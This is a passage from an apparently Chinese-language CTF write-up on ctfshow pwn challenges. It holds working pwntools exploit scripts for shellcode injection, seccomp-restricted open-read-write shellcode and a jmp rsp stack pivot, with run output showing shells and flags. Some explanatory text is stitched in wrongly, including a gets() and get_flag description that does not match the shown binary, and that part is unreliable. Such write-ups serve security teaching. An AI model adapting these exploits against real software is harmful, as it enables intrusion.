class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">payload = <span class="string">b&#x27;\x90&#x27;</span>*<span class="number">1336</span> + shellcode</span><br><span class="line">io.recvuntil(<span class="string">b&quot;The current location: 0x&quot;</span>)</span><br><span class="line">addr = u64(unhex(io.recvline(keepends=<span class="literal">False</span>).zfill(<span class="number">16</span>)),endian=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="comment">#读取一行数据（keepends=False 去掉换行符），然后用 zfill(16) 补零到 16 个字符</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;Addr: &quot;</span> + <span class="built_in">hex</span>(addr))</span><br><span class="line">io.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">sh = addr + <span class="number">668</span> + <span class="number">0x35</span>;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Sending: &quot;</span> + <span class="built_in">hex</span>(sh))</span><br><span class="line">io.sendline(<span class="built_in">hex</span>(sh).encode())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 71</span><br><span class="line">Addr: 0x7ffcb41930cc</span><br><span class="line">Sending: 0x7ffcb419339d</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag</span><br></pre></td></tr></table></figure><h2 id="pwn69"><a href="#pwn69" class="headerlink" title="pwn69"></a>pwn69</h2><p>Hint：可以尝试用ORW读flag flag文件位置为&#x2F;ctfshow_flag</p><p><strong><code>ORW指的是Open-Read-Write技术，是一种利用系统调用读取文件内容（如flag文件）的攻击方法。</code></strong></p><p><strong><code>ORW通过以下三个系统调用实现：</code></strong></p><p><strong><code>open：打开目标文件，获取文件描述符。</code></strong></p><p><strong><code>read：通过文件描述符读取文件内容到缓冲区。</code></strong></p><p><strong><code>write：将缓冲区的内容写入标准输出。</code></strong></p><p>当攻击者通过漏洞控制程序执行流程后，可以注入或执行类似ORW的代码来读取敏感文件。例如，攻击者可以通过ROP（Return-Oriented Programming）或直接注入汇编代码来实现ORW。</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       amd64-64-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br></pre></td></tr></table></figure><p>64位仅部分开启RELRO。其他保护全关</p><p>IDA查看main函数（依据函数功能修改对应函数名）：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  mmap((<span class="type">void</span> *)<span class="number">0x123000</span>, <span class="number">0x1000u</span>, <span class="number">6</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  seccomp();</span><br><span class="line">  setvbuf();</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*mmap()函数的主要用途有三个：</span></span><br><span class="line"><span class="comment">1、将一个普通文件映射到内存中，通常在需要对文件进行频繁读写时使用，这样用内存读写取代I/O读</span></span><br><span class="line"><span class="comment">写，以获得较高的性能；</span></span><br><span class="line"><span class="comment">2、将特殊文件进行匿名内存映射，可以为关联进程提供共享内存空间；</span></span><br><span class="line"><span class="comment">3、为无关联的进程提供共享内存空间，一般也是将一个普通文件映射到内存中。*/</span></span><br></pre></td></tr></table></figure><p>把从0x123000开始的地址，大小为0x1000的长度，权限改为可写可执行</p><p>跟进seccomp()：</p><p><strong>Seccomp（Secure Computing Mode）是 Linux 内核中的一种安全机制，用于限制进程可以调用的<code>系统调用</code>（Syscalls），从而减少潜在的攻击面。</strong></p><p><strong>沙盒环境：Seccomp 常用于沙盒环境中，限制程序的权限，防止恶意程序通过高风险系统调用攻击系统。</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">seccomp</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = seccomp_init(<span class="number">0</span>);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112</span>, <span class="number">0</span>, <span class="number">0</span>); <span class="comment">//初始化 seccomp 上下文</span></span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112</span>, <span class="number">60</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> seccomp_load(v1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*2147418112表示 “允许执行该系统调用”；第三个参数（如0、1、2、60）：系统调用号（syscall number）对应read，write，open，exit；最后一个参数0：表示 “不检查系统调用的参数”（允许该系统调用的任何参数）*/</span></span><br></pre></td></tr></table></figure><p>沙盒过滤，seccomp-tools 是一个用于分析和调试 Seccomp 策略的工具集，它可以帮助你检查程序是否启用了 Seccomp 以及其具体的 Seccomp 配置。通过运行 seccomp-tools dump .&#x2F;pwn，你可以查看目标程序 .&#x2F;pwn 的 Seccomp 策略。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="built_in">arch</span></span><br><span class="line"> 0001: 0x15 0x00 0x08 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0010</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  <span class="keyword">if</span> (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x05 0xffffffff  <span class="keyword">if</span> (A != 0xffffffff) goto 0010</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x00000000  <span class="keyword">if</span> (A == <span class="built_in">read</span>) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x00000001  <span class="keyword">if</span> (A == write) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0x00000002  <span class="keyword">if</span> (A == open) goto 0009</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x0000003c  <span class="keyword">if</span> (A != <span class="built_in">exit</span>) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure><p>只有read，write，open，exit可以使用，使用 open–&gt;read–&gt;write 这样的orw的方式</p><p>跟进漏洞函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now you can use ORW to do&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x38u</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;No you don&#x27;t understand I say!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>明显的溢出漏洞 那么思路就是先写入orw类型的shellcode，然后跳转去执行，buf的大小只有0x20，感觉不够我们写全rop攻击链，程序一开始的时候给我们开辟了0x100可执行的空间，打算在这边写shellcode，然后用buf的溢出跳转过来执行我们的shellcode。</p><p>写orw的shellcode：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">orw_shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/ctfshow_flag&quot;</span>) <span class="comment"># 打开根目录下的ctfshow_flag文件</span></span><br><span class="line">orw_shellcode += shellcraft.read(<span class="number">3</span>,mmap,<span class="number">100</span>) <span class="comment"># 读取文件标识符是3的文件0x100个字节存放到mmap分配的地址空间里[0代表stdin，1代表stdout，2代表标准错误输出。其他文件就是从3开始了。]</span></span><br><span class="line">orw_shellcode += shellcraft.write(<span class="number">1</span>,mmap,<span class="number">100</span>) <span class="comment"># 将mmap地址上的内容输出0x100个字节</span></span><br><span class="line">shellcode = asm(orw_shellcode)</span><br><span class="line"><span class="comment">#read里的fd写3是因为程序执行的时候文件描述符是从3开始的，write里的1是标准输出到显示器</span></span><br></pre></td></tr></table></figure><p>然后buf里面的rop攻击链：</p><p>buf里面的rop攻击链是要往mmap里写入orw_shellcode,让程序跳转到mmap去执行orw_shellcode</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">0x100</span>))+asm(<span class="string">&quot;mov rax,0x123000; jmp rax&quot;</span>)</span><br><span class="line"><span class="comment">#从标准输入（文件描述符 0）读取最多 0x100 字节的内容到 mmap_ar 指向的内存区域。</span></span><br><span class="line"><span class="comment">#将 rax 寄存器设置为 0x123000，然后跳转到该地址。这里的 0x123000 是 mmap_ar 的地址，用于跳转到攻击者控制的内存区域。</span></span><br></pre></td></tr></table></figure><p>这样buf里的rop就达到了我们想要的目的，下面就要想办法让buf里的内容被执行，发现该程序有jmp rsp</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ROPgadget --binary pwn  | grep jmp</span><br><span class="line">0x0000000000400a01 : jmp rsp</span><br></pre></td></tr></table></figure><p>其实就是这个后门函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sub_4009EE</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __asm &#123; jmp     rsp &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>**<code>rsp是栈顶指针寄存器，jmp rsp的作用是返回到栈顶，由于调用时是一个新的函数，所以开辟了新的栈，所以jmp rsp实际上是返回这条指令位置+8处。</code>**那意味着我们可以通过这条指令跳转到当前栈顶处然后执行我们布置在栈上shellcode从而实现ORW。</p><p>利用它可以跳转到buf去执行，buf地址是rsp-0x30[buf的起始地址到 “返回地址” 的偏移:(rbp + 8) - (rbp - 0x20) &#x3D; 0x28(<code>+8是旧rbp的长度</code>),再写入<code>8字节</code>的<code>jmp rsp</code>地址（因为返回地址占 8 字节）]</p><p>所以buf中完整的rop攻击链：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">jmp_rsp = <span class="number">0x400a01</span></span><br><span class="line">payload = asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">0x100</span>))+asm(<span class="string">&quot;mov rax,0x123000; jmp rax&quot;</span>)</span><br><span class="line"><span class="comment"># buf里的rop是往mmap里读入0x100长度的数据，跳转到mmap的地址执行</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment"># buf的大小是0x20，加上rbp 0x8是0x28，用&#x27;\x00&#x27;去填充剩下的位置</span></span><br><span class="line">payload += p64(jmp_rsp)+asm(<span class="string">&quot;sub rsp,0x30; jmp rsp&quot;</span>) <span class="comment"># 返回地址写上跳转到rsp</span></span><br><span class="line"><span class="comment">#asm(&quot;sub rsp,0x30; jmp rsp&quot;):调整栈指针（rsp）的位置，使其指向栈上的有效代码</span></span><br><span class="line"><span class="comment">#sub rsp, 0x30：将栈指针rsp减去0x30（48 字节）。由于栈是向下增长的（地址从高到低），这会让rsp指向更靠前的栈内存（地址更小的位置）。</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;do&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br></pre></td></tr></table></figure><p>将buf中的rop链发送后，再传入orw_shellcode就能读出flag了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>]</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">mmap = <span class="number">0x123000</span></span><br><span class="line">jmp_rsp = <span class="number">0x400a01</span></span><br><span class="line">orw_shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/ctfshow_flag&quot;</span>)</span><br><span class="line">orw_shellcode += shellcraft.read(<span class="number">3</span>,mmap,<span class="number">100</span>)</span><br><span class="line">orw_shellcode += shellcraft.write(<span class="number">1</span>,mmap,<span class="number">100</span>)</span><br><span class="line">shellcode = asm(orw_shellcode)</span><br><span class="line">payload = asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">0x100</span>))+asm(<span class="string">&quot;mov rax,0x123000; jmp rax&quot;</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(jmp_rsp)+asm(<span class="string">&quot;sub rsp,0x30; jmp rsp&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;do&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 288</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">No you don<span class="string">&#x27;t understand I say!</span></span><br><span class="line"><span class="string">flag&#123;just_test_my_process&#125;</span></span><br><span class="line"><span class="string">/ctfshowPH\x89\xe71\xd21\xf6j\x02X\x0f\x051\xc0j\x03_jdZ\xbe\x01\x01\x01\x01\x81\xf6\x011\x13\x01\x0f\x05j\x01_jdZ\xbe\x01\x01\x01\x01\x81\xf6\x011\x13\x01j\x01X\x0f\x05\x00\x00\x00\x00\x00\x00\x00\x00</span></span><br></pre></td></tr></table></figure><h2 id="pwn70"><a href="#pwn70" class="headerlink" title="pwn70"></a>pwn70</h2><p>Hint：可以开始你的个人秀了 flag文件位置为&#x2F;flag</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       amd64-64-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      Canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>64位程序部分开启RELRO，开启栈保护<br>告诉了我们flag文件位置，hint中还是让我们用ORW读flag，* Hint  : Try use ‘ORW’ to get flag</p><p>查看沙箱的情况：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="built_in">arch</span></span><br><span class="line"> 0001: 0x15 0x00 0x05 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0007</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  <span class="keyword">if</span> (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x02 0xffffffff  <span class="keyword">if</span> (A != 0xffffffff) goto 0007</span><br><span class="line"> 0005: 0x15 0x01 0x00 0x0000003b  <span class="keyword">if</span> (A == execve) goto 0007</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure><p>1.程序只允许在 x86_64 架构下运行。</p><p>2.系统调用必须小于 0x40000000，否则拒绝执行。</p><p>3.特别地，如果系统调用是 execve（编号为 0x3b），则直接拒绝（KILL）。</p><p>需要注入shellcode来做，虽然有canary但是NX没开，栈还是能执行的。</p><p>ida 无法反汇编main：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000400A68 main            proc near               ; DATA XREF: _start+1D↑o</span><br><span class="line">.text:0000000000400A68</span><br><span class="line">.text:0000000000400A68 var_80          = qword ptr -80h</span><br><span class="line">.text:0000000000400A68 var_74          = dword ptr -74h</span><br><span class="line">.text:0000000000400A68 s               = byte ptr -70h</span><br><span class="line">.text:0000000000400A68 var_8           = qword ptr -8</span><br><span class="line">.text:0000000000400A68</span><br><span class="line">.text:0000000000400A68 ; __unwind &#123;</span><br><span class="line">.text:0000000000400A68                 push    rbp</span><br><span class="line">.text:0000000000400A69                 mov     rbp, rsp</span><br><span class="line">.text:0000000000400A6C                 add     rsp, 0FFFFFFFFFFFFFF80h</span><br><span class="line">.text:0000000000400A70                 mov     [rbp+var_74], edi</span><br><span class="line">.text:0000000000400A73                 mov     [rbp+var_80], rsi</span><br><span class="line">.text:0000000000400A77                 mov     rax, fs:28h</span><br><span class="line">.text:0000000000400A80                 mov     [rbp+var_8], rax</span><br><span class="line">.text:0000000000400A84                 xor     eax, eax</span><br><span class="line">.text:0000000000400A86                 mov     eax, 0</span><br><span class="line">.text:0000000000400A8B                 call    init</span><br><span class="line">.text:0000000000400A90                 mov     eax, 0</span><br><span class="line">.text:0000000000400A95                 call    set_secommp   #沙箱</span><br><span class="line">.text:0000000000400A9A                 lea     rax, [rbp+s]</span><br><span class="line">.text:0000000000400A9E                 mov     esi, 68h ; &#x27;h&#x27;  ; n</span><br><span class="line">.text:0000000000400AA3                 mov     rdi, rax        ; s</span><br><span class="line">.text:0000000000400AA6                 call    _bzero</span><br><span class="line">.text:0000000000400AAB                 mov     eax, 0</span><br><span class="line">.text:0000000000400AB0                 call    logo</span><br><span class="line">.text:0000000000400AB5                 lea     rdi, aWelcomeTellMeY ; &quot;Welcome,tell me your name:&quot;</span><br><span class="line">.text:0000000000400ABC                 call    _puts</span><br><span class="line">.text:0000000000400AC1                 lea     rax, [rbp+s]</span><br><span class="line">.text:0000000000400AC5                 mov     edx, 64h ; &#x27;d&#x27;  ; nbytes</span><br><span class="line">.text:0000000000400ACA                 mov     rsi, rax        ; buf</span><br><span class="line">.text:0000000000400ACD                 mov     edi, 0          ; fd</span><br><span class="line">.text:0000000000400AD2                 mov     eax, 0</span><br><span class="line">.text:0000000000400AD7                 call    _read</span><br><span class="line">.text:0000000000400ADC                 sub     eax, 1</span><br><span class="line">.text:0000000000400ADF                 cdqe</span><br><span class="line">.text:0000000000400AE1                 mov     [rbp+rax+s], 0</span><br><span class="line">.text:0000000000400AE6                 lea     rax, [rbp+s]</span><br><span class="line">.text:0000000000400AEA                 mov     rdi, rax</span><br><span class="line">.text:0000000000400AED                 call    is_printable</span><br><span class="line">.text:0000000000400AF2                 test    eax, eax</span><br><span class="line">.text:0000000000400AF4                 jz      short loc_400AFE</span><br><span class="line">.text:0000000000400AF6                 lea     rax, [rbp+s]</span><br><span class="line">.text:0000000000400AFA                 call    rax</span><br><span class="line">.text:0000000000400AFC                 jmp     short loc_400B0A</span><br></pre></td></tr></table></figure><p>is_printable:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004008EA is_printable    proc near               ; CODE XREF: main+85↓p</span><br><span class="line">.text:00000000004008EA</span><br><span class="line">.text:00000000004008EA s               = qword ptr -28h</span><br><span class="line">.text:00000000004008EA var_14          = dword ptr -14h</span><br><span class="line">.text:00000000004008EA</span><br><span class="line">.text:00000000004008EA ; __unwind &#123;</span><br><span class="line">.text:00000000004008EA                 push    rbp</span><br><span class="line">.text:00000000004008EB                 mov     rbp, rsp</span><br><span class="line">.text:00000000004008EE                 push    rbx</span><br><span class="line">.text:00000000004008EF                 sub     rsp, 28h</span><br><span class="line">.text:00000000004008F3                 mov     [rbp+s], rdi</span><br><span class="line">.text:00000000004008F7                 mov     [rbp+var_14], 0</span><br><span class="line">.text:00000000004008FE                 jmp     short loc_400933</span><br><span class="line">.text:0000000000400900 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000400900</span><br><span class="line">.text:0000000000400900 loc_400900:                             ; CODE XREF: is_printable+5E↓j</span><br><span class="line">.text:0000000000400900                 mov     eax, [rbp+var_14]</span><br><span class="line">.text:0000000000400903                 movsxd  rdx, eax</span><br><span class="line">.text:0000000000400906                 mov     rax, [rbp+s]</span><br><span class="line">.text:000000000040090A                 add     rax, rdx</span><br><span class="line">.text:000000000040090D                 movzx   eax, byte ptr [rax]</span><br><span class="line">.text:0000000000400910                 cmp     al, 1Fh</span><br><span class="line">.text:0000000000400912                 jle     short loc_400928</span><br><span class="line">.text:0000000000400914                 mov     eax, [rbp+var_14]</span><br><span class="line">.text:0000000000400917                 movsxd  rdx, eax</span><br><span class="line">.text:000000000040091A                 mov     rax, [rbp+s]</span><br><span class="line">.text:000000000040091E                 add     rax, rdx</span><br><span class="line">.text:0000000000400921                 movzx   eax, byte ptr [rax]</span><br><span class="line">.text:0000000000400924                 cmp     al, 7Fh</span><br><span class="line">.text:0000000000400926                 jnz     short loc_40092F</span><br><span class="line">.text:0000000000400928</span><br><span class="line">.text:0000000000400928 loc_400928:                             ; CODE XREF: is_printable+28↑j</span><br><span class="line">.text:0000000000400928                 mov     eax, 0</span><br><span class="line">.text:000000000040092D                 jmp     short loc_40094F</span><br><span class="line">.text:000000000040092F ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040092F</span><br><span class="line">.text:000000000040092F loc_40092F:                             ; CODE XREF: is_printable+3C↑j</span><br><span class="line">.text:000000000040092F                 add     [rbp+var_14], 1</span><br><span class="line">.text:0000000000400933</span><br><span class="line">.text:0000000000400933 loc_400933:                             ; CODE XREF: is_printable+14↑j</span><br><span class="line">.text:0000000000400933                 mov     eax, [rbp+var_14]</span><br><span class="line">.text:0000000000400936                 movsxd  rbx, eax</span><br><span class="line">.text:0000000000400939                 mov     rax, [rbp+s]</span><br><span class="line">.text:000000000040093D                 mov     rdi, rax        ; s</span><br><span class="line">.text:0000000000400940                 call    _strlen</span><br><span class="line">.text:0000000000400945                 cmp     rbx, rax</span><br><span class="line">.text:0000000000400948                 jb      short loc_400900</span><br><span class="line">.text:000000000040094A                 mov     eax, 1</span><br><span class="line">.text:000000000040094F</span><br><span class="line">.text:000000000040094F loc_40094F:                             ; CODE XREF: is_printable+43↑j</span><br><span class="line">.text:000000000040094F                 add     rsp, 28h</span><br><span class="line">.text:0000000000400953                 pop     rbx</span><br><span class="line">.text:0000000000400954                 pop     rbp</span><br><span class="line">.text:0000000000400955                 retn</span><br><span class="line">.text:0000000000400955 ; &#125; // starts at 4008EA</span><br><span class="line">.text:0000000000400955 is_printable    endp</span><br></pre></td></tr></table></figure><p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p><p>还在程序中找到了get_flag函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28280</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name:\n&quot;</span>)</span><br><span class="line">shellcode = <span class="string">b&#x27;\x00\xc0&#x27;</span> + asm(shellcraft.cat(<span class="string">&#x27;flag&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">from pwn import *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,<span class="built_in">arch</span>=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,28175)</span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">//调用open()</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">//绕过strlen()检查</span></span><br><span class="line"><span class="string">mov r15, 0x67616c66</span></span><br><span class="line"><span class="string">push r15</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">mov rsi, 0</span></span><br><span class="line"><span class="string">mov rax, 2</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pwn 071</span></span><br><span class="line"><span class="string">题目环境：</span></span><br><span class="line"><span class="string">//调用read()</span></span><br><span class="line"><span class="string">mov r14, 3</span></span><br><span class="line"><span class="string">mov rdi, r14</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">mov rdx, 0xff</span></span><br><span class="line"><span class="string">mov rax, 0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">//调用write()</span></span><br><span class="line"><span class="string">mov rdi,1</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">mov rdx, 0xff</span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">payload = asm(shellcode)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn36-1"><a href="#pwn36-1" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p><p>32位IDA查看main函数：</p><figure class="highlight 